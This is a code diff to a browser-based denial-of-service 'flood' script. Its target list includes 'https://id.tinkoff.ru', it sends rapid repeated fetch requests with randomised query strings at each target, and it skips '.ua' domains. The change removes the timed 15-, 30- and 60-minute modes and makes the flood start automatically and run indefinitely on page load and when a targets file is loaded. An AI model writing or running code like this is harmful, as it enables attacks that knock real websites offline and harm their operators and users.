@@ -72,11 +72,6 @@ let targets = [
   'https://id.tinkoff.ru',
 ];
 
-
-
-const start15Min = document.getElementById('start-15');
-const start30Min = document.getElementById('start-30');
-const start60Min = document.getElementById('start-60');
 const startInfMin = document.getElementById('start-inf');
 const stopper = document.getElementById('stop');
 
@@ -165,22 +160,22 @@ async function flood(target) {
     const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
     if (domainName !== 'ua') {
       queue.push(
-          fetchWithTimeout(target + rand, { timeout: 1000 })
-              .catch((error) => {
-                console.clear();
-                if (error.code === 20 /* ABORT */) {
-                  return;
-                }
-                if (targetStats[target])
-                  targetStats[target].number_of_errored_responses++;
-              })
-              .then((response) => {
-                if (response && !response.ok) {
-                  if (targetStats[target])
-                    targetStats[target].number_of_errored_responses++;
-                }
-                if (targetStats[target]) targetStats[target].number_of_requests++;
-              })
+        fetchWithTimeout(target + rand, { timeout: 1000 })
+          .catch((error) => {
+            console.clear();
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            if (targetStats[target])
+              targetStats[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              if (targetStats[target])
+                targetStats[target].number_of_errored_responses++;
+            }
+            if (targetStats[target]) targetStats[target].number_of_requests++;
+          })
       );
     } else {
       if (targetStats[target]) {
@@ -196,27 +191,6 @@ async function flood(target) {
 }
 
 let timer;
-
-start15Min.addEventListener('click', () => {
-  continueFlood = true;
-  targets.map(flood);
-  clearTimeout(timer);
-  timer = setTimeout(() => stopper.click(), 15 * 1000 * 60);
-});
-
-start30Min.addEventListener('click', () => {
-  continueFlood = true;
-  targets.map(flood);
-  clearTimeout(timer);
-  timer = setTimeout(() => stopper.click(), 30 * 1000 * 60);
-});
-
-start60Min.addEventListener('click', () => {
-  continueFlood = true;
-  targets.map(flood);
-  clearTimeout(timer);
-  timer = setTimeout(() => stopper.click(), 60 * 1000 * 60);
-});
 
 startInfMin.addEventListener('click', () => {
   continueFlood = true;
@@ -273,7 +247,7 @@ inputFile.addEventListener('change', (e) => {
     if (vanish.checked) targets = fr.result.match(/[^\r\n]+/g);
     else targets.push(...fr.result.match(/[^\r\n]+/g));
     changeTargets();
-    start15Min.click();
+    startInfMin.click();
   };
   fr.readAsText(e.target.files[0]);
 });
@@ -288,4 +262,4 @@ switch (userLang) {
   default:
     break;
 }
-start15Min.click();
+startInfMin.click();
